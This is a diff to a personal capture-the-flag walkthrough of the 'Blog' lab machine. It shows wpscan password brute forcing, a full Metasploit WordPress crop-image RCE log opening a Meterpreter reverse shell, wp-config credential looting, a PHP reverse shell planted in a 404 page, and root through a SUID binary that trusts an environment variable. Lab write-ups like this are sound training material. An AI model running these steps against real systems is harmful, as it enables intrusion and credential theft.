@@ -253,13 +253,14 @@ Interesting Finding(s):
 [+] Memory used: 310.105 MB
 [+] Elapsed time: 00:01:11
 ```
-> Found two usernames<br/>Let's add them to users.txt file
-> Now let's try two brute force wp-admin using rockyou dict.
+Found two usernames
+Let's add them to users.txt file
+Now let's try two brute force wp-admin using rockyou dict.
 
-> Wait! This login form shows what exactly incorrect: username or passwd</br>
-> Let's determine correct user manually -> it's bjoel
+Wait! This login form shows what exactly incorrect: username or passwd
+Let's determine correct user manually -> it's bjoel
 
-> Nope... They both are correct. I just entered first username incorrectly.
+Nope... They both are correct. I just entered first username incorrectly.
 
 ## Bruteforcing wp-adming via wpscan
 ```
@@ -267,9 +268,167 @@ wpscan --url blog.thm -U users.txt -P /usr/share/wordlists/rockyou.txt
 ```
 password is cutiepie1 for user kwheel
 
-> This infor is catched from walkthrough from youtube, just because real bruteforcing is to long
+This infor is catched from walkthrough from youtube, just because real bruteforcing is to long
 
-> So wp admin panel accessed<br/>
-> Let's look around
+So wp admin panel accessed
+Let's look around
 
-# WALKINTHOUGH STOPPED DUE TO UNEXPECTED ERROR
+Unfortunatly it's not allowed to directly load scritps on the site.
+
+Let's check version 5.0 for vulns
+Wow! We can do rce with an image and a little peace of magic
+Or just running msf
+Let's do that
+```
+msfconsole        
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+
+
+       =[ metasploit v6.2.30-dev                          ]
++ -- --=[ 2272 exploits - 1191 auxiliary - 404 post       ]
++ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View all productivity tips with the 
+tips command
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/multi/http/wp_crop_rce
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/wp_crop_rce) > show options
+
+Module options (exploit/multi/http/wp_crop_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
+   USERNAME                    yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.112    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.8.44.172
+LHOST => 10.8.44.172
+msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
+RHOSTS => blog.thm
+msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
+USERNAME => kwheel
+msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
+PASSWORD => cutiepie1
+msf6 exploit(multi/http/wp_crop_rce) > run
+
+[*] Started reverse TCP handler on 10.8.44.172:4444 
+[*] Authenticating with WordPress using kwheel:cutiepie1...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload
+[+] Image uploaded
+[*] Including into theme
+[*] Sending stage (39927 bytes) to 10.10.227.2
+[*] Meterpreter session 1 opened (10.8.44.172:4444 -> 10.10.227.2:54592) at 2022-12-24 15:30:01 -0500
+[*] Attempting to clean up files...
+
+meterpreter > id
+```
+
+There is wp-config.php file
+Let's see what does it hide from us
+Following interesting strings are found:
+```
+/** MySQL database username */
+define('DB_USER', 'wordpressuser');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'LittleYellowLamp90!@');
+```
+Seems it's good idea to try the second password for the second user (bjoel)
+Oh, it is allowed to upload ssh scripts for bjoel...)
+I think that the site is too boring. Let's make in more funny via revers shell script (https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
+Just insert it at the code of 404 page and go to the non-existent page
+
+GREAT! Reverse shell is got 
+But I've catche myself on a thought that it better to try bjoel passwd for ssh...
+Fuck... Not working
+
+Okey let's continue with revshell. Out goal is to get bjoel user session. Hold on, bjoel! We're coming!
+
+Puting linepas via nc 
+On victim machine `nc -lp 1234 > linpeas.sh`
+On local `nc -w 3 blog.thm 1234 < /usr/share/peass/linpeas/linpeas.sh`
+
+Interesting file found `-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SGID binary)`
+It's a binary compiled c file. Let's send it to local machine and discvore it
+```
+file checker                
+checker: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped
+```
+
+Let's reverse it to source code 
+```
+int main (int argc, char **argv, char **envp);
+; var uint32_t var_1h @ rbp-0x1
+0x0000071a      push    rbp
+0x0000071b      mov     rbp, rsp
+0x0000071e      sub     rsp, 0x10
+0x00000722      lea     rdi, str.admin ; 0x7f4 ; const char *name
+0x00000729      call    getenv     ; sym.imp.getenv ; char *getenv(const char *name)
+0x0000072e      test    rax, rax
+0x00000731      setne   al
+0x00000734      mov     byte [var_1h], al
+0x00000737      cmp     byte [var_1h], 0
+0x0000073b      je      0x75a
+0x0000073d      mov     edi, 0
+0x00000742      call    setuid     ; sym.imp.setuid
+0x00000747      lea     rdi, str._bin_bash ; 0x7fa ; const char *string
+0x0000074e      call    system     ; sym.imp.system ; int system(const char *string)
+0x00000753      mov     eax, 0
+0x00000758      jmp     0x76b
+0x0000075a      lea     rdi, str.Not_an_Admin ; 0x804 ; const char *s
+0x00000761      call    puts       ; sym.imp.puts ; int puts(const char *s)
+0x00000766      mov     eax, 0
+0x0000076b      leave
+0x0000076c      ret
+```
+
+Such assembly code is given us from Cutter.
+This code gets meanining of environent variable "admin" and if there is something in there,
+gives admin session
+
+So let's exploit that `export admin=FUCK_YOU`
+
+BOOOM!
+**PWNED**
